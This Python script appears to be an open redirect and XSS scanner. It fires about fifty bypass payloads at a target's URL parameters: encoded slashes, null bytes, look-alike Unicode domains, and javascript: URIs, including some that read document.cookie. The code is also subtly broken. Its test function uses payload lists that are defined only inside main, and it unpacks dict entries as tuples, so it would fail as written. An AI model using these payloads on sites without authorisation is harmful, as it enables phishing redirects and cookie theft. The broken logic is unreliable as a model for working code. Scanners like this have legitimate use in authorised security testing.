import requests
from datetime import datetime

def test_open_redirect(site, directory, params, payloads, header=None, proxies=None, allow_redirects=True, verify=True, cookies=None, verbose=False):
    configs = [
        ("Open Redirect", payloads_open_redirect),
        ("XSS via Open Redirect", payloads_open_redirect_xss)
    ]

    for vulnerability_type, payloads_list in configs:
        for idx, (name, payload) in enumerate(payloads_list):
            for parameter in params:
                if verbose:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] Testing parameter {parameter} for {name}")
                else:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] Testing for {name} on parameter {parameter} ({idx}/{len(payloads_list)-1})")

                try:
                    response = requests.get(f"{site}{directory}?{parameter}={payload}",
                                            headers=header, proxies=proxies,
                                            allow_redirects=allow_redirects, verify=verify,
                                            cookies=cookies)

                    if "https://google.com/" in response.url:
                        print(f"[{datetime.now().strftime('%H:%M:%S')}] Parameter {parameter} might be vulnerable to {vulnerability_type}")
                        print(f"Payload: {payload}")
                    elif "javascript:alert(1)" in response.text:
                        print(f"[{datetime.now().strftime('%H:%M:%S')}] Parameter {parameter} might be vulnerable to {vulnerability_type}")
                        print(f"Payload: {payload}")

                except requests.RequestException as e:
                    print(f"Error testing {name} on parameter {parameter}: {e}")

def main():
    site = "https://example.com"
    directory = "/path"
    params = ["param1", "param2"]
    header = None
    proxies = None
    allow_redirects = True
    verify = True
    cookies = None
    verbose = False

    payloads_open_redirect = [{
		"name": "Basic Open Redirect",
		"payload": "https://google.com"
	},
	{
		"name": "Open redirect bypass using '//'",
		"payload": "//google.com/"
	},
	{
		"name": "'%09' Open redirect",
		"payload": "%09.google.com"
	},
	{
		"name": "Whitelisted domain using '%252e'",
		"payload": "%252e.google.com"
	},
	{
		"name": "Whitelisted domain injection open redirect",
		"payload": ".google.com"
	},
	{
		"name": "Open redirect bypass using 'https:'",
		"payload": "https:google.com"
	},
	{
		"name": "Open redirect bypass '//'",
		"payload": "\/\/google.com/"
	},
	{
		"name": "Open redirect bypass '//'",
		"payload": "/\/google.com/"
	},
	{
		"name": "Open redirect bypass Using '%E3%80%82' to bypass '.'",
		"payload": "//google%E3%80%82com"
	},
	{
		"name": "Open redirect bypass using null byte",
		"payload": "//google%00.com"
	},
	{
		"name": "Whitelisted domain open redirect bypass using '@'",
		"payload": "@google.com/"
	},
	{
		"name": "Whitelisted domain open redirect using special chars",
		"payload": "https://ⓖⓞⓞⓖⓛⓔ.ⓒⓞⓜ"
	},
	{
		"name": "Whitelisted domain open redirect with special chars and '%01'",
		"payload": "%01https://ⓖⓞⓞⓖⓛⓔ.ⓒⓞⓜ"
	},
	{
		"name": "Open redirect bypass using '%01'",
		"payload": "%01https://google.com"
	},
	{
		"name": "Open redirect bypass using special chars and '////%09'",
		"payload": "////%09/ⓖⓞⓞⓖⓛⓔ.ⓒⓞⓜ"
	},
	{
		"name": "Open redirect bypass using '//%09'",
		"payload": "//%09/google.com"
	},
	{
		"name": "Whitelisted domain open redirect using %2f",
		"payload": "//%2f%2fgoogle.com"
	},
	{
		"name": "Whitelisted domain open redirect using '%2f' and '$2f'",
		"payload": "$2f%2fgoogle.com%2f%2f"
	},
	{
		"name": "Whitelisted domain open redirect using %2f",
		"payload": "%2fgoogle.com%2f%2f"
	},
	{
		"name": "Whitelisted domain open redirect using '/%5c'",
		"payload": "/%5cgoogle.com"
	},
	{
		"name": "Whitelisted domain open redirect using '%5c' and '@' for redirection",
		"payload": "////%5cwhitelisted.com@google.com"
	},
	{
		"name": "Whitelisted domain open redirect using null byte injection",
		"payload": "//google%00.com"
	},
	{
		"name": "Open redirect bypass using '%252e'",
		"payload": "google%252ecom"
	},
	{
		"name": "Open redirect bypass using '<>//'",
		"payload": "<>//google.com"
	},
	{
		"name": "Open redirect bypass using '/<>//'",
		"payload": "/<>//google.com"
	},
	{
		"name": "Whitelisted domain open redirect using '//;@'",
		"payload": "//;@google.com"
	},
	{
		"name": "Whitelisted domain open redirect using '/.'",
		"payload": "/.google.com"
	},
	{
		"name": "Whitelisted domain open redirect using '/〱'",
		"payload": "/〱google.com"
	},
	{
		"name": "Whitelisted domain open redirect using '../'",
		"payload": "../google.com"
	},
	{
		"name": "Whitelisted domain open redirect using  '%2e%2e'",
		"payload": "//google.com/%2e%2e"
	}
]

    payloads_open_redirect_xss = [{
		"name": "Basic xss as open redirect",
		"payload": "javascript:alert(1)"
	},
	{
		"name": "Basic xss WAF bypass as open redirect using '%0d%0a'",
		"payload": "java%0d%0ascript%0d%0a:alert(0)"
	},
	{
		"name": "XSS payload as open redirect using '%250A'",
		"payload": "javascript://%250Aalert(1)"
	},
	{
		"name": "XSS payload as open redirect using '%250A' and '//?1'",
		"payload": "javascript://%250Aalert(1)//?1"
	},
	{
		"name": "XSS payload as open redirect using '%250A1?'",
		"payload": "javascript://%250A1?alert(1):0"
	},
	{
		"name": "XSS payload as open redirect",
		"payload": "%09Jav%09ascript:alert(document.domain)"
	},
	{
		"name": "XSS payload as open redirect",
		"payload": "javascript://%250Alert(document.location=document.cookie)"
	},
	{
		"name": "XSS payload as open redirect using '%09'",
		"payload": "/%09/javascript:alert(1);"
	},
	{
		"name": "XSS payload as open redirect using '%09'",
		"payload": "/%09/javascript:alert(1)"
	},
	{
		"name": "XSS payload as open redirect using '%5c'",
		"payload": "//%5cjavascript:alert(1);"
	},
	{
		"name": "XSS payload as open redirect using '%5c'",
		"payload": "//%5cjavascript:alert(1)"
	},
	{
		"name": "XSS payload as open redirect using '%5c'",
		"payload": "/%5cjavascript:alert(1);"
	},
	{
		"name": "XSS payload as open redirect using '%5c'",
		"payload": "/%5cjavascript:alert(1)"
	},
	{
		"name": "XSS payload as open redirect using '%0a'",
		"payload": "javascript://%0aalert(1)"
	},
	{
		"name": "XSS payload as open redirect using '<>'",
		"payload": "<>javascript:alert(1);"
	},
	{
		"name": "XSS payload as open redirect",
		"payload": "//javascript:alert(1);"
	},
	{
		"name": "XSS payload as open redirect",
		"payload": "//javascript:alert(1)"
	},
	{
		"name": "XSS payload as open redirect",
		"payload": "/javascript:alert(1);"
	},
	{
		"name": "XSS WAF bypass payload using '%0d%0a' as open redirect",
		"payload": "jaVAscript://whitelisted.com//%0d%0aalert(1);//"
	},
	{
		"name": "XSS WAF bypass payload using '%a0' as open redirect",
		"payload": "javascript://whitelisted.com?%a0alert%281%29"
	},
	{
		"name": "Advanced XSS payload as open redirect",
		"payload": "/x:1/:///%01javascript:alert(document.cookie)/"
	}
]

    test_open_redirect(site, directory, params, payloads_open_redirect, header, proxies, allow_redirects, verify, cookies, verbose)
    test_open_redirect(site, directory, params, payloads_open_redirect_xss, header, proxies, allow_redirects, verify, cookies, verbose)

if __name__ == "__main__":
    main()
